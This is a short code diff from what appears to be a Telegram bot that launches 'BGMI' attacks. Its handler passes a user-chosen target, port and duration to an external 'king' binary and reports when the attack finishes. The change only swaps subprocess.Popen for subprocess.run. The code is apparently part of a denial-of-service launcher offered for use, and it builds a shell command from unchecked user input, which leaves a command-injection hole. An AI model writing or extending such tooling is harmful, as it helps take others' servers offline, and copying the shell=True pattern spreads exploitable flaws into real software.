@@ -332,8 +332,7 @@ def handle_attack(message):
                     # Temporarily replace bot token to prevent king from sending messages
                     bot.token = "INVALID_TOKEN"
                     full_command = f"king {target} {port} {time} 500"
-                    process = subprocess.Popen(full_command, shell=True)
-                    process.wait()
+                    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                     # Restore original token
                     bot.token = original_token
                     completion_msg = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time} seconds"
